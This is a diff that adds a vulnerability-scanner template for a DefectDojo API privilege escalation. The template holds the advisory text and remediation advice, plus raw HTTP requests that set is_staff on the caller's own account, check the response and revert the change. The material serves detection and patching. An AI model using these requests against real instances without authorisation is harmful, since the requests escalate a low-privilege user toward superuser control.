@@ -1,0 +1,89 @@
+id: GHSA-w2j3-x3j3-mm43
+
+info:
+  name: "DefectDojo 2.59.0 — API Privilege Escalation via unguarded is_staff (GHSA-w2j3-x3j3-mm43)"
+  author: "Patrowl Security Team"
+  severity: high
+  description: |
+    DefectDojo's API v2 user endpoint (dojo/api_v2/serializers.py UserSerializer)
+    exposes the `is_staff` field as writable but, before the fix, did not restrict
+    it to superusers (only `is_superuser` was guarded). A non-superuser holding the
+    delegated "Configuration -> Users (change)" permission (auth.change_user) can
+    PATCH /api/v2/users/{id}/ with {"is_staff": true} to grant itself staff status.
+    Combined with the default-enabled Django admin (/admin/), is_staff acts as a
+    near-superuser bypass and allows escalation to full superuser. Fixed by adding
+    a superuser-only guard for is_staff (2.58.3, 2.58.4, 3.0.0).
+  remediation: "Upgrade DefectDojo to 2.58.3 / 2.58.4 / 3.0.0+. Do not grant auth.change_user to non-superusers and disable the /admin/ panel (DD_DJANGO_ADMIN_ENABLED=False)."
+  reference:
+    - https://github.com/DefectDojo/django-DefectDojo/security/advisories/GHSA-w2j3-x3j3-mm43
+    - https://github.com/DefectDojo/django-DefectDojo/commit/68a272f299d096249fd3ba9c2676bf69012857bf
+    - https://github.com/DefectDojo/django-DefectDojo/pull/14952
+  classification:
+    cvss-metrics: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    cwe-id: CWE-269
+  metadata:
+    verified: true
+    detection-mode: remote
+    vendor: defectdojo
+    product: defectdojo
+    ecosystem: pip
+    fixed-version: "2.58.3"
+    shodan-query: 'http.title:"DefectDojo"'
+  tags: defectdojo,api,privilege-escalation,authenticated,ghsa
+
+variables:
+  # A NON-superuser API token that holds the "Configuration -> Users (change)"
+  # (auth.change_user) permission. Provide it at runtime: -var token=<token>
+  token: "REPLACE_WITH_LOWPRIV_TOKEN"
+
+http:
+  - raw:
+      # Step 1 — resolve the token owner's own user id.
+      - |
+        GET {{BaseURL}}/api/v2/user_profile/ HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Token {{token}}
+        Accept: application/json
+
+      # Step 2 — privilege escalation: set is_staff on self. Vulnerable builds
+      # return 200 with "is_staff":true; patched builds return 400 with
+      # "Only superusers are allowed to add or edit staff users".
+      - |
+        PATCH {{BaseURL}}/api/v2/users/{{uid}}/ HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Token {{token}}
+        Content-Type: application/json
+
+        {"is_staff": true}
+
+      # Step 3 — revert (best-effort hygiene): drop the staff flag we just set.
+      - |
+        PATCH {{BaseURL}}/api/v2/users/{{uid}}/ HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Token {{token}}
+        Content-Type: application/json
+
+        {"is_staff": false}
+
+    req-condition: true
+
+    extractors:
+      - type: regex
+        name: uid
+        internal: true
+        part: body_1
+        group: 1
+        regex:
+          - '"user":\s*\{"id":\s*(\d+)'
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200"
+      - type: word
+        part: body_2
+        words:
+          - '"is_staff":true'
+          - '"is_staff": true'
+        condition: or
